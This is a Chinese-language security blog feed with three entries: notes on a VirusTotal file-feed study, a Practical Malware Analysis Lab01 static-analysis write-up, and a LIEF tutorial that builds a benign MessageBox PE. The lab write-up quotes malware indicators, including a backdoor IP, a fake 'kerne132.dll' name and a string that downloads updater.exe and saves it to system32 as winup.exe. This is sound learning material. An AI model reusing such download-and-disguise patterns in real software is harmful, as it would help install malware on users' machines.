VT文件源与AV遥测数据相比有多大？</p><p>VT文件源包含的恶意软件数量是遥测数据的八倍，使其成为获取恶意样本的重要来源。</p></li><li><p>(2) 文件源中的样本有多新鲜？</p><p>在收集到的样本中，有89%是新样本，即之前VT未知的样本，而且文件源每天提供超过一百万个新样本。</p></li><li><p>(3) 文件源在文件类型方面有多样化吗？</p><p>文件源中三分之二的样本是Windows PE文件，但该源对于多种文件类型来说都是一个很好的样本来源。文件源缺乏统一的文件类型字段，对于大量样本来说，文件类型的识别是具有挑战性的。</p><p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2017.17.45.png" alt="截屏2024-05-29 17.17.45"></p></li><li><p>(4) 有多少比例的样本在首次扫描时可以被检测为恶意的？</p><p>VT文件源是一个文件源而不是恶意软件源。其一半的数据量是未被检测到的样本，而53%的样本在首次观察时没有被检测到。另一方面，由于这些样本与之前看到的恶意软件具有相似特征（即匹配现有的签名），有41%至47%的样本在首次被杀毒引擎检测时可以被识别为恶意软件。</p></li><li><p>(5) 文件源在家族方面有多样化吗？</p><p>该数据源具有多样性，拥有至少100个样本的家族达4.9千个。然而，这种多样性主要是由于peexe和apk家族。对于这两种文件类型，该数据源是构建大规模家族分类数据集的良好来源。AVCLASS2在首次观察时就能为62%的样本进行标记。因此，它可以用作过滤器，移除那些已被良好检测的家族的样本，使分析师可以专注于38%未标记的样本。</p></li><li><p>(6) 有多少比例的恶意样本在首次扫描时完全未被检测到？</p><p>至少有0.3%提交给VT的样本最初是完全未被检测到的（FUD），即它们在首次VT观察时没有被检测到，但后来至少有4个引擎认为它们是恶意的。与其他文件类型相比，PDF文档更有可能是FUD。</p></li><li><p>(7) 有多少比例的样本是签名的？</p><p>VT支持提取多种文件类型的代码签名，但整个文件源的样本中只有一小部分（5.6%）以及peexe样本中的3.7%拥有代码签名。</p></li><li><p>(8) 文件源和AV遥测数据在恶意样本上的重叠情况如何？哪一个更快地看到样本？</p><p>遥测数据和VT文件源观察到的恶意样本集大部分是不相交的（共有的样本只占文件源的1.2%到1.8%）。因此，即使是最大的安全供应商也只能看到恶意样本全域的一小部分。VT文件源中的家族分布与遥测观察到的显著不同，这表明VT可能不是一个好的资源来推断家族对真实用户的影响。两个数据集中的新样本在设备上平均提前4.4小时被看到，因此文件源中的新恶意样本相当新近。此外，有39%的新样本在VT中被观察到之前还未在用户设备中出现，所以VT可能为安全供应商提供有用的早期警报。</p></li></ul><h2 id="聚类-Clustering"><a href="#聚类-Clustering" class="headerlink" title="聚类 Clustering"></a>聚类 Clustering</h2><p><strong>聚类特征 Clustering features</strong></p><p>检查9个可以识别相似样本的特征。</p><p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-29%2018.02.59.png" alt="截屏2024-05-29 18.02.59"></p><p><strong>聚类方法  Clustering approaches</strong></p><ul><li>特征值分组（FVG）：通过在单一特征的值上使用等值关系对样本进行分组，例如，所有具有相同vhash值的样本形成一个聚类。使用FVG进行聚类时，特征向量按照（特征值，样本哈希，扫描日期）的三元组排序。特征值的变化表明一个新的聚类。FVG是一种极具可扩展性的方法。我们使用不同的特征评估FVG，以了解哪些特征提供高精度，并且这些特征能达到什么召回率。</li><li>单一链接的层次聚合聚类（HAC）：</li><li>基于阈值的层次聚合聚类（HAC-T）：这是一种使用TLSH哈希值聚类样本的可扩展方法。</li></ul><p><strong>精确度评估</strong></p><p><strong>可扩展性</strong></p><p>FVG-vhash：1.4h 分类效率最高</p><p>HAC-T：22.4h</p><p><strong>聚类整个数据集</strong> Clustering the whole dataset.</p><p>使用FVG-vhash，特征为：</p><ul><li>Avc2_family:</li><li>vhash</li><li>Cert_thumbprint</li><li>imphash</li></ul><h2 id="检测不太良性的样本-Detecting-Not-so-Benign-Samples"><a href="#检测不太良性的样本-Detecting-Not-so-Benign-Samples" class="headerlink" title="检测不太良性的样本 Detecting Not-so-Benign Samples"></a>检测不太良性的样本 Detecting Not-so-Benign Samples</h2><p>在图表中描述的聚类分类基于两个比率，即r1和r4，这两个比率定义如下：</p><ul><li><strong>r1</strong>: 聚类中至少被检测到一次的样本占聚类中所有样本的百分比。</li><li><strong>r4</strong>: 聚类中至少被检测到四次的样本占聚类中所有样本的百分比。</li></ul><p>这两个比率用来判断聚类中样本的检测频率，从而将聚类分为以下几种类型：</p><ol><li><strong>完全恶意聚类（Fully malicious clusters）</strong>:<ul><li>这种类型的聚类中，所有样本（100%）都至少被检测到一次或四次，即r1或r4等于1。这表示聚类中的每一个样本都被视为恶意。</li></ul></li><li><strong>完全良性聚类（Fully benign clusters）</strong>:<ul><li>在这种聚类中，没有样本被检测到，即r1和r4都为0。这表示聚类中的所有样本都未被任何检测工具标记为恶意。</li></ul></li><li><strong>混合聚类（Mixed clusters）</strong>:<ul><li>混合聚类包含既被检测到也未被检测到的样本，即0 &lt; r1 &lt; 1 和 0 &lt; r4 &lt; 1。这意味着聚类中的一部分样本被检测为恶意，而另一部分没有被检测到。</li></ul></li><li><strong>恶意多数聚类（Malicious majority clusters）</strong>:<ul><li>这类聚类中，大部分但不是全部的样本至少被检测到一次或四次，但未达到完全恶意的标准。通常，这意味着超过半数的样本显示出恶意特征，但仍有少数样本未被检测到。</li></ul></li></ol><p><img src="/../images/A-Deep-Dive-into-VirusTotal/%E6%88%AA%E5%B1%8F2024-05-30%2013.58.19.png" alt="截屏2024-05-30 13.58.19"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;A-Deep-Dive-into-VirusTotal-Characterizing-and-Clustering-a-Massive-File-Feed&quot;&gt;&lt;a href=&quot;#A-Deep-Dive-into-VirusTotal-Characterizing-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PracticalMalwareAnalysis-Lab01</title>
    <link href="http://example.com/2024/04/25/PracticalMalwareAnalysis-Lab01/"/>
    <id>http://example.com/2024/04/25/PracticalMalwareAnalysis-Lab01/</id>
    <published>2024-04-25T05:42:59.000Z</published>
    <updated>2024-05-07T10:26:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lab01-静态分析基础技术"><a href="#Lab01-静态分析基础技术" class="headerlink" title="Lab01 静态分析基础技术"></a>Lab01 静态分析基础技术</h1><h2 id="lab1-1"><a href="#lab1-1" class="headerlink" title="lab1-1"></a>lab1-1</h2><h3 id="1-将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？"><a href="#1-将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？" class="headerlink" title="1. 将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？"></a>1. 将文件上传到virustotals分析并查看报告。文件是否匹配到了已有反病毒软件特征？</h3><p>如图所示，文件匹配到了反病毒软件的特征，并分别被38、51种反病毒软件识别。<img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.28.39.png" alt="截屏2024-04-25 15.28.39"></p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.26.06.png" alt="截屏2024-04-25 15.26.06"></p><h3 id="2-这些文件是什么时候编译的？"><a href="#2-这些文件是什么时候编译的？" class="headerlink" title="2. 这些文件是什么时候编译的？"></a>2. 这些文件是什么时候编译的？</h3><p>这是文件创建的时间。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.51.16.png" alt="截屏2024-04-25 15.51.16"></p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2015.52.01.png" alt="截屏2024-04-25 15.52.01"></p><h3 id="3-这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？"><a href="#3-这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？" class="headerlink" title="3. 这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？"></a>3. 这些文件是否存在迹象说明它们是否已被加壳或混淆了？如果是，这些迹象在哪里？</h3><p>通过PEiD 软件的输出得到它们没有被加壳或混淆。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.08.22.png" alt="截屏2024-04-25 16.08.22"></p><p>这里举一个已被混淆的输出，这是一个被 UPX版本在0.89.6到2.90之间的某个版本压缩过。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.09.22.png" alt="截屏2024-04-25 16.09.22"></p><h3 id="4-是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？"><a href="#4-是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？" class="headerlink" title="4. 是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？"></a>4. 是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？</h3><p>这是通过Dependency Walker 分析<code>lab01-01.exe</code>的结果，通过导入函数 CopyFileA, FindNextFileA, FindFirstFileA 可知，该代码是<strong>寻找并复制文件</strong></p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.30.18.png" alt="截屏2024-04-25 16.30.18"></p><p>这是通过Dependency Walker 分析<code>lab01-01.dll</code>的结果，我只在导入表<code>KERNEL32.DLL</code>中找到有用的信息。通过导入函数CreateProcessA, CreateMutexA等函数，推测是创建进程和互斥锁，让进程休眠的作用。</p><p><strong>WS2_32.DLL在书的第14 页有提到</strong>，是用来联网的DLL</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.34.47.png" alt="截屏2024-04-25 16.34.47"></p><h3 id="5-是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？"><a href="#5-是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？" class="headerlink" title="5. 是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？"></a>5. 是否有任何其他文件或基于主机的迹象，让你可以在受感染的系统查找？</h3><p>使用PEview打开lab01-01.exe结果如图所示，我们发现<code>kernel32.dll</code>和<code>kerne132.dll</code>。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2016.50.15.png" alt="截屏2024-04-25 16.50.15"></p><h3 id="6-是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码"><a href="#6-是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码" class="headerlink" title="6. 是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码"></a>6. 是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码</h3><p>使用PEview打开lab01-01.dll 结果如图所示，我们可以看到如图所示的ip地址 127.26.152.13，推断可以通过这个信息发现恶意代码。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-04-25%2018.38.49.png" alt="截屏2024-04-25 18.38.49"></p><h3 id="7-你猜这些文件的目的是什么"><a href="#7-你猜这些文件的目的是什么" class="headerlink" title="7. 你猜这些文件的目的是什么"></a>7. 你猜这些文件的目的是什么</h3><blockquote><p>[!WARNING]</p><p>猜不出来。。。</p><p>答案上说：.dll文件可能是一个后门文件。而.exe文件是用来安装和运行DLL文件的</p></blockquote><h2 id="lab1-2"><a href="#lab1-2" class="headerlink" title="lab1-2"></a>lab1-2</h2><p>分析lab01-02.exe 文件</p><h3 id="1-将Lab01-02-exe-文件上传到virus-total查看报告。"><a href="#1-将Lab01-02-exe-文件上传到virus-total查看报告。" class="headerlink" title="1. 将Lab01-02.exe 文件上传到virus total查看报告。"></a>1. 将Lab01-02.exe 文件上传到virus total查看报告。</h3><p>文件匹配到了已有的反病毒软件特征</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.16.01.png" alt="截屏2024-05-07 15.16.01"></p><h3 id="2-这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。"><a href="#2-这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。" class="headerlink" title="2. 这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。"></a>2. 这个文件是否被加壳或混淆？迹象是什么？如果已加壳，进行脱壳。</h3><p>该文件已被UPX加壳，如图所示。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.22.43.png" alt="截屏2024-05-07 15.22.43"></p><p>使用upx进行脱壳。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.27.38.png" alt="截屏2024-05-07 15.27.38"></p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.29.34.png" alt="截屏2024-05-07 15.29.34"></p><h3 id="3-有没有任何导入函数能够暗示出这个程序的功能？"><a href="#3-有没有任何导入函数能够暗示出这个程序的功能？" class="headerlink" title="3. 有没有任何导入函数能够暗示出这个程序的功能？"></a>3. 有没有任何导入函数能够暗示出这个程序的功能？</h3><p><del>从导入函数推测该程序可能会产生一个互斥锁。</del></p><p>错误的原因：几乎所有的程序都会新建一个线程或打开一个锁。因此我们要查看另外两个库</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.43.58.png" alt="截屏2024-05-07 15.43.58"></p><p>这两个库中有函数<code>CreateServiceA</code>、<code>InternetOpenUrlA</code>、<code>InternetOpenA</code>。这些函数是用来打开网络和新建服务器的。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2016.03.16.png" alt="截屏2024-05-07 16.03.16"></p><h3 id="4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"><a href="#4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"></a>4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器</h3><p>结合上文，网络的迹象可能是向 <a href="http://www.malwareanalysisbook.com/">www.malwareanalysisbook.com</a> 发送一些信息。其中 internet Explorer.8.0 可能是利用该浏览器的漏洞， Malservice 可能是一个恶意服务。</p><p>应该通过一个名为Malservice的服务，并通过到 <a href="http://www.malwareanalysisbook.com/">www.malwareanalysisbook.com</a> 的网络流量，检查被恶意代码感染的主机。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2015.47.12.png" alt="截屏2024-05-07 15.47.12"></p><h2 id="lab1-3"><a href="#lab1-3" class="headerlink" title="lab1-3"></a>lab1-3</h2><p>分析lab01-03.exe 文件</p><h3 id="1-将Lab01-03-exe-文件上传到virus-total查看报告。"><a href="#1-将Lab01-03-exe-文件上传到virus-total查看报告。" class="headerlink" title="1. 将Lab01-03.exe 文件上传到virus total查看报告。"></a>1. 将Lab01-03.exe 文件上传到virus total查看报告。</h3><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2016.11.53.png" alt="截屏2024-05-07 16.11.53"></p><h3 id="2-这个文件是否有混淆或加壳的迹象？"><a href="#2-这个文件是否有混淆或加壳的迹象？" class="headerlink" title="2. 这个文件是否有混淆或加壳的迹象？"></a>2. 这个文件是否有混淆或加壳的迹象？</h3><p>查看导入表，里面只有两个函数，可以推断该文件已被加壳。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.08.56.png" alt="截屏2024-05-07 17.08.56"></p><p>用PEiD无法知道是哪种壳，现阶段的学习无法将该软件脱壳。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.10.20.png" alt="截屏2024-05-07 17.10.20"></p><h3 id="3-有无导入函数能够暗示这个程序的功能？"><a href="#3-有无导入函数能够暗示这个程序的功能？" class="headerlink" title="3. 有无导入函数能够暗示这个程序的功能？"></a>3. 有无导入函数能够暗示这个程序的功能？</h3><p>无法脱壳，目前不能回答这个问题</p><h3 id="4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器-1"><a href="#4-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器-1" class="headerlink" title="4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"></a>4. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器</h3><p>无法脱壳，目前不能回答这个问题</p><h2 id="lab1-3-1"><a href="#lab1-3-1" class="headerlink" title="lab1-3"></a>lab1-3</h2><h3 id="1-将Lab01-04-exe-文件上传到virus-total查看报告。"><a href="#1-将Lab01-04-exe-文件上传到virus-total查看报告。" class="headerlink" title="1. 将Lab01-04.exe 文件上传到virus total查看报告。"></a>1. 将Lab01-04.exe 文件上传到virus total查看报告。</h3><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.25.23.png" alt="截屏2024-05-07 17.25.23"></p><h3 id="2-这个文件是否有混淆或加壳的迹象？-1"><a href="#2-这个文件是否有混淆或加壳的迹象？-1" class="headerlink" title="2. 这个文件是否有混淆或加壳的迹象？"></a>2. 这个文件是否有混淆或加壳的迹象？</h3><p>这个文件没有被加壳或混淆的迹象。</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2017.25.39.png" alt="截屏2024-05-07 17.25.39"></p><h3 id="3-这个文件是什么时候被编译的"><a href="#3-这个文件是什么时候被编译的" class="headerlink" title="3. 这个文件是什么时候被编译的"></a>3. 这个文件是什么时候被编译的</h3><h3 id="4-有无导入函数能够暗示这个程序的功能？"><a href="#4-有无导入函数能够暗示这个程序的功能？" class="headerlink" title="4. 有无导入函数能够暗示这个程序的功能？"></a>4. 有无导入函数能够暗示这个程序的功能？</h3><p>通过导入函数表和部分二进制数据的信息来看，</p><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2018.10.50.png" alt="截屏2024-05-07 18.10.50"></p><p>图中的十六进制数据中包含了一些可读的ASCII字符串,其中有两条值得注意:</p><ol><li>“winup.exe %s%s”: 暗示该文件可能与一个名为”winup.exe”的程序相关,并且可能会向其传递一些参数。</li><li>“system32\winup.exe %s%s <a href="http://www.practicalmalwareanalysis.com/updater.exe">http://www.practicalmalwareanalysis.com/updater.exe</a>“: 这是一个URL,指向一个名为”updater.exe”的文件。结合前面的”winup.exe”和”system32”的信息,可以推测该程序可能会从该URL下载一个名为”updater.exe”的文件,并将其保存在系统的”system32”目录下,伪装成”winup.exe”。</li></ol><p><img src="/../images/PracticalMalwareAnalysis-Lab01/%E6%88%AA%E5%B1%8F2024-05-07%2018.21.58.png" alt="截屏2024-05-07 18.21.58"></p><h3 id="5-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"><a href="#5-哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="5. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器"></a>5. 哪些基于主机或网络的迹象可以被用来确定被这个恶意代码所感染的机器</h3><h3 id="6-这个文件在资源段中包含一个资源。使用Resource-Hacker-工具来检查资源，然后抽取资源。"><a href="#6-这个文件在资源段中包含一个资源。使用Resource-Hacker-工具来检查资源，然后抽取资源。" class="headerlink" title="6. 这个文件在资源段中包含一个资源。使用Resource Hacker 工具来检查资源，然后抽取资源。"></a>6. 这个文件在资源段中包含一个资源。使用Resource Hacker 工具来检查资源，然后抽取资源。</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lab01-静态分析基础技术&quot;&gt;&lt;a href=&quot;#Lab01-静态分析基础技术&quot; class=&quot;headerlink&quot; title=&quot;Lab01 静态分析基础技术&quot;&gt;&lt;/a&gt;Lab01 静态分析基础技术&lt;/h1&gt;&lt;h2 id=&quot;lab1-1&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>LIEF TUTORIALS</title>
    <link href="http://example.com/2024/04/15/LIEF-TUTORIALS/"/>
    <id>http://example.com/2024/04/15/LIEF-TUTORIALS/</id>
    <published>2024-04-15T01:36:52.000Z</published>
    <updated>2024-04-15T02:21:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LIEF-入门"><a href="#LIEF-入门" class="headerlink" title="LIEF 入门"></a>LIEF 入门</h1><h2 id="1-Parse-and-manipulate-format"><a href="#1-Parse-and-manipulate-format" class="headerlink" title="1. Parse and manipulate format"></a>1. Parse and manipulate format</h2><p>使用<code>lief.PE.parse()</code>创建<code>PE.Binary</code>对象。</p><p>访问不同的PE头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(binary.dos_header)</span><br><span class="line"><span class="built_in">print</span>(binary.header)</span><br><span class="line"><span class="built_in">print</span>(binary.optional_header)</span><br></pre></td></tr></table></figure><p>可以通过抽象方法或直接通过PE定义访问类的成员</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using the abstract layer</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> binary.imported_functions:</span><br><span class="line">  <span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using the PE definition</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> binary.imports:</span><br><span class="line">  <span class="built_in">print</span>(func)</span><br></pre></td></tr></table></figure><h2 id="2-Create-a-PE-from-scrath"><a href="#2-Create-a-PE-from-scrath" class="headerlink" title="2.Create a PE from scrath"></a>2.Create a PE from scrath</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment"># Create a PE which pop a MessageBox</span></span><br><span class="line"><span class="comment"># with the message &quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lief <span class="keyword">import</span> PE</span><br><span class="line"></span><br><span class="line">title   = <span class="string">&quot;LIEF is awesome\0&quot;</span></span><br><span class="line">message = <span class="string">&quot;Hello World\0&quot;</span></span><br><span class="line"></span><br><span class="line">data =  <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, title))</span><br><span class="line">data += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, message))</span><br><span class="line"><span class="comment"># code 是可执行文件的机器代码，也即程序的执行指令</span></span><br><span class="line">code = [</span><br><span class="line">        <span class="number">0x6a</span>, <span class="number">0x00</span>,                         <span class="comment"># push 0x00 uType</span></span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,       <span class="comment"># push VA(title)</span></span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,       <span class="comment"># push VA(message)</span></span><br><span class="line">        <span class="number">0x6a</span>, <span class="number">0x00</span>,                         <span class="comment"># push 0 hWnd</span></span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x54</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="comment"># call MessageBoxA</span></span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x00</span>,                         <span class="comment"># push 0 uExitCode</span></span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x4C</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">0x00</span>  <span class="comment"># call ExitProcess</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 PE.Binary 实例</span></span><br><span class="line">binary32 = PE.Binary(<span class="string">&quot;pe_from_scratch&quot;</span>, PE.PE_TYPE.PE32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PE 的 .text section</span></span><br><span class="line">section_text                 = PE.Section(<span class="string">&quot;.text&quot;</span>)</span><br><span class="line">section_text.content         = code</span><br><span class="line">section_text.virtual_address = <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PE 的 .data section </span></span><br><span class="line">section_data                 = PE.Section(<span class="string">&quot;.data&quot;</span>)</span><br><span class="line">section_data.content         = data</span><br><span class="line">section_data.virtual_address = <span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加 section</span></span><br><span class="line">section_text = binary32.add_section(section_text, PE.SECTION_TYPES.TEXT)</span><br><span class="line">section_data = binary32.add_section(section_data, PE.SECTION_TYPES.DATA)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(section_text)</span><br><span class="line"><span class="built_in">print</span>(section_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 PE 文件的入口点为 section_text 也即 .text section</span></span><br><span class="line">binary32.optional_header.addressof_entrypoint = section_text.virtual_address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加库和导入函数</span></span><br><span class="line">kernel32 = binary32.add_library(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">kernel32.add_entry(<span class="string">&quot;ExitProcess&quot;</span>)</span><br><span class="line"></span><br><span class="line">user32 = binary32.add_library(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">user32.add_entry(<span class="string">&quot;MessageBoxA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测函数加载到内存后的地址</span></span><br><span class="line">ExitProcess_addr = binary32.predict_function_rva(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;ExitProcess&quot;</span>)</span><br><span class="line">MessageBoxA_addr = binary32.predict_function_rva(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of &#x27;ExitProcess&#x27;: 0x&#123;:06x&#125; &quot;</span>.<span class="built_in">format</span>(ExitProcess_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of &#x27;MessageBoxA&#x27;: 0x&#123;:06x&#125; &quot;</span>.<span class="built_in">format</span>(MessageBoxA_addr))</span><br><span class="line"></span><br><span class="line">builder = PE.Builder(binary32)</span><br><span class="line">builder.build_imports(<span class="literal">True</span>)</span><br><span class="line">builder.build()</span><br><span class="line">builder.write(<span class="string">&quot;pe_from_scratch.exe&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-Play-with-ELF-symbols"><a href="#3-Play-with-ELF-symbols" class="headerlink" title="3. Play with ELF symbols"></a>3. Play with ELF symbols</h2><p>修改ELF文件符号。（由于目前关注的是PE文件，暂时跳过这一节）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LIEF-入门&quot;&gt;&lt;a href=&quot;#LIEF-入门&quot; class=&quot;headerlink&quot; title=&quot;LIEF 入门&quot;&gt;&lt;/a&gt;LIEF 入门&lt;/h1&gt;&lt;h2 id=&quot;1-Parse-and-manipulate-format&quot;&gt;&lt;a href=&quot;#1-Pa</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Pesidious</title>
    <link href="http://example.com/2024/04/12/Pesidious/"/>
    <id>http://example.com/2024/04/12/Pesidious/</id>
    <published>2024-04-12T08:13:26.000Z</published>
    <updated>2024-04-12T09:00:59.000Z</updated>
    
